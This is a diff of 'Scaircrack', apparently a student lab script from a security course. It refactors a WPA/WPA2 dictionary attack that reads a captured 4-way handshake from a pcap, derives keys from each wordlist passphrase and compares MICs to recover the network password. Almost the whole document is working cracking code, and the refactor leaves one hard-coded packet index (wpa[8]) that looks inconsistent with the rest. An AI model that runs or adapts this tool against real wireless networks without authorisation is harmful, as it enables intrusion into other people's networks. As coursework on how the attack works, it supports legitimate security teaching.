@@ -7,71 +7,136 @@ Scaircrack
 Script to test multiple passwords from a file, creates a MIC with each password and compares it with the one retrieved in the last packet of the 4-way handshake.
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
-__license__ 	= "GPL"
-__version__ 	= "1.0"
-__email__ 	= "abraham.rubinstein@heig-vd.ch"
-__status__ 	= "Prototype"
+from numpy import array
+from numpy import array_split
+from pbkdf2 import *
+from binascii import a2b_hex, b2a_hex
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+__author__ = "Abraham Rubinstein et Yann Lederrey"
+__copyright__ = "Copyright 2017, HEIG-VD"
+__license__ = "GPL"
+__version__ = "1.0"
+__email__ = "abraham.rubinstein@heig-vd.ch"
+__status__ = "Prototype"
 __modified_by__ = "Valzino Benjamin, Tissot Olivier, Bailat Joachim"
 
-from scapy.all import *
-from binascii import a2b_hex, b2a_hex
-from pbkdf2 import *
-from numpy import array_split
-from numpy import array
-import hmac, hashlib
+import hmac
+import hashlib
 
-def customPRF512(key,A,B):
+
+def get_passphrases(file):
+    """
+    This function returns a list of passphrases from a file
+    """
+    passphrases = []
+    with open(file) as f:
+        passphrases = f.readlines()
+    passphrases = [x.strip() for x in passphrases]
+    return passphrases
+
+
+def collect_infos_from_pcap(pcapfile):
+    """
+    This function parses a pcap file and returns the following parameters:
+    - APmac
+    - Clientmac
+    - APnonce
+    - Clientnonce
+    - MIC
+    - data
+    """
+    wpa = rdpcap(pcapfile)
+
+    # identify where is the first packet of the 4-way handshake
+    for i in range(0, len(wpa)):
+        if wpa[i].type == 2 and wpa[i].subtype == 8:
+            if wpa[i][EAPOL].type == 3:
+                break
+
+    if (i == len(wpa)):
+        print("No 4-way handshake found in the pcap file")
+        exit()
+
+    # sync indexes to the first packet of the 4-way handshake
+    i = i - 1
+
+    # retrieve APmac and clientmac from the first packet of the 4-way handshake
+    APmac = a2b_hex(wpa[i].addr2.replace(":", ""))
+    Clientmac = a2b_hex(wpa[i].addr1.replace(":", ""))
+
+    # retrieve ssid from the beacon frame
+    #iterate over all packets before the 4-way handshake
+    for j in range(0, i):
+        #check if the packet is a beacon frame
+        if wpa[j].type == 0 and wpa[j].subtype == 8:
+            #check if the beacon frame is from the same AP as the 4-way handshake
+            if str(wpa[j].addr2).replace(":", "") == APmac.hex():
+                ssid = wpa[j].info.decode()
+                ssid = str.encode(ssid)
+                break
+    
+    if (j == i):
+        print("No beacon frame found in the pcap file")
+        exit()
+
+
+    # retrieve ANonce from first packet of the 4-way handshake
+    ANonce = a2b_hex(wpa[i][EAPOL].load[13:45].hex())
+
+    # retrieve SNonce from second packet of the 4-way handshake
+    SNonce = a2b_hex(wpa[i+1][EAPOL].load[13:45].hex())
+
+    # retrieve MIC and data from the fourth packet of the 4-way handshake
+    # mic =  wpa[i+4].original[-18:-2].hex()
+    mic = wpa[i+3].original[-18:-2].hex()
+    data = wpa[i+3].original[48:-18] + b'\0' * 16 + wpa[8].original[-2:]
+
+    print("We found all required parameters for the attack in the pcap !")
+
+    return ssid, APmac, Clientmac, ANonce, SNonce, mic, data
+
+
+def customPRF512(key, A, B):
     """
     This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
     """
     blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
+    i = 0
+    R = b''
+    while i <= ((blen*8+159)/160):
+        hmacsha1 = hmac.new(key, A+str.encode(chr(0x00)) +
+                            B+str.encode(chr(i)), hashlib.sha1)
+        i += 1
         R = R+hmacsha1.digest()
     return R[:blen]
 
-# Read capture file
-wpa=rdpcap("wpa_handshake.cap") 
 
-ssid        = wpa[0].info.decode() ###### A COMMENTER
-APmac       = a2b_hex(wpa[0].addr2.replace(":","")) ###### A COMMENTER
-Clientmac   = a2b_hex(wpa[1].addr1.replace(":","")) ###### A COMMENTER
-
-# Authenticator and Supplicant Nonces
-ANonce      = a2b_hex(wpa[5][EAPOL].load[13:45].hex()) ###### A COMMENTER
-SNonce      = a2b_hex(bytes(wpa[6])[65:97].hex()) ######### A COMMENTER
+def main():
+    # retrieve infos from 4way handshake
+    ssid, APmac, Clientmac, ANonce, SNonce, mic, data = collect_infos_from_pcap(
+        "./wpa_handshake.cap")
     
-ssid = str.encode(ssid)
+    print("Starting attack...")
+    # iterate over all passphrases in the wordlist
+    for passphrase in get_passphrases("wordlist.txt"):
+        A = "Pairwise key expansion"
+        B = min(APmac, Clientmac)+max(APmac, Clientmac) + \
+            min(ANonce, SNonce)+max(ANonce, SNonce)
+        passphrase = str.encode(passphrase.replace(" ", "").replace("\n", ""))
+        pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
+        ptk = customPRF512(pmk, str.encode(A), B)
+        mic_passphrase = hmac.new(
+            ptk[0:16], data, hashlib.sha1).hexdigest()[:32]
+
+        if (mic_passphrase == mic):
+            print("Password found : ", passphrase.decode())
+            exit(0)
 
 
-data        = wpa[8].original[48:-18] + b'\0' * 16 + wpa[8].original[-2:]
-mic_to_test = wpa[8].original[-18:-2].hex() # SO IT LOOKS GOOD
+    print("Password not found !")
+    print("Maybe try another wordlist ?")
 
-# Open wordlist
-passphrases =  open("wordlist.txt", 'r')
-# Read every word in worlist 
-for passphrase in passphrases:
-    
-    A    = "Pairwise key expansion"
-    B    = min(APmac, Clientmac)+max(APmac, Clientmac)+min(ANonce, SNonce)+max(ANonce, SNonce)
-    data = wpa[8].original[48:-18] + b'\0' * 16 + wpa[8].original[-2:]
-    
-    passphrase = passphrase.replace("\n", "")
-    passphrase = str.encode(passphrase)
-    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)
-    ptk = customPRF512(pmk,str.encode(A),B)
-    mic_passphrase = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]
-
-    if(mic_passphrase == mic_to_test):
-        print("/!\ Password found : ", passphrase.decode(), "/!\ ")
-        exit(0)
-    
-    print("Password incorrect : ", passphrase.decode())
-
-print("No corresponding password found")
-exit(1)
+if __name__ == "__main__":
+    main()
